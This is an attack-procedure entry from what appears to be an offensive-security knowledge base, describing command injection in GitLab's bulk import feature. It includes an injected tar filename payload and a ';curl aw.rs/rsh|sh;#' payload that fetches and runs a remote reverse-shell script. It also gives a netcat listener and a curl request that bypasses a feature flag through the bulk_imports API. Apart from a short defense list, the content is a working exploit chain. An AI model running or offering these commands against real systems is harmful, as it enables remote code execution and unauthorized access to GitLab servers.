---
id: proc-verify-injection-bypass-flag
tags:
  - verification
  - rce
  - bypass
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/cat-tmp-file]]'
  - '[[commands/curl-bulk-import-bypass]]'
  - '[[commands/nc-reverse-shell]]'
  - '[[commands/id-user]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:24:14.602Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
  - '[[Valid Accounts]]'
---
# Verify-Command-Injection-and-Bypass-Feature-Flag

## Summary

This procedure verifies successful RCE by checking injected file output and demonstrates bypassing the feature flag via direct API call to /import/bulk_imports.json with source_type 'project_entity', triggering the pipeline without enabling bulk_import_projects.

## Description

After import timeout (2-5 minutes), the validator executes the injected command, creating files like /tmp/1234 with 'lala'. Logs show tar errors. For bypass, POST JSON with project_entity to invoke ProjectPipeline directly, exploiting insufficient validation in BulkImportsController.

## Requirements

1. Import initiated and timed out
2. Sudo access on GitLab host for verification
3. Curl for API bypass

## Defense

Defensive measures and detection strategies:

- Validate source_type in BulkImportsController (block project_entity without flag)
- Scan for unexpected files in /tmp (e.g., via cron jobs)
- Detect reverse shells on non-standard ports

## Objectives

1. Confirm payload execution and RCE
2. Escalate to reverse shell if needed
3. Bypass protections for unauthorized access

## Instructions

### Step 1: Check Injected File

**Context**: Verify basic injection success.

**Command** ([[commands/cat-tmp-file]]):
```bash
cat /tmp/1234
```

> Outputs 'lala' if successful.

### Step 2: Monitor Logs for Errors

**Context**: Look for injection indicators.

**Instructions**: In tailed logs, search for 'tar: /tmp/ggg;echo lala|tee /tmp/1234;#: Cannot open' or similar, confirming execution.

### Step 3: Advanced Payload and Reverse Shell

**Context**: Escalate to shell; update payload to ';curl aw.rs/rsh|sh;#', listen with netcat.

**Command** ([[commands/nc-reverse-shell]]):
```bash
nc -vnlkp 12345
```

> Accepts connection; then run [[commands/id-user]]:

**Command** ([[commands/id-user]]):
```bash
id
```

> Shows uid=1000(git).

### Step 4: API Bypass

**Context**: Trigger without flag.

**Command** ([[commands/curl-bulk-import-bypass]]):
```bash
curl 'https://gitlab.com/import/bulk_imports.json' -H 'content-type: application/json' -H 'PRIVATE-TOKEN: your_token' --data-raw '{"bulk_import":[{"source_type":"project_entity","source_full_path":"group1/project1","destination_namespace":"secret-vakzz","destination_name":"group1aaa"}]}'
```

> Starts import; response JSON confirms.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Unix Shell]] Unix Shell
- [[Valid Accounts]] Valid Accounts (bypass)

### Sub-Techniques


## Commands Used

- [[commands/cat-tmp-file]]
- [[commands/curl-bulk-import-bypass]]
- [[commands/nc-reverse-shell]]
- [[commands/id-user]]

## Tools Used


## Tags

- verification
- rce
- bypass
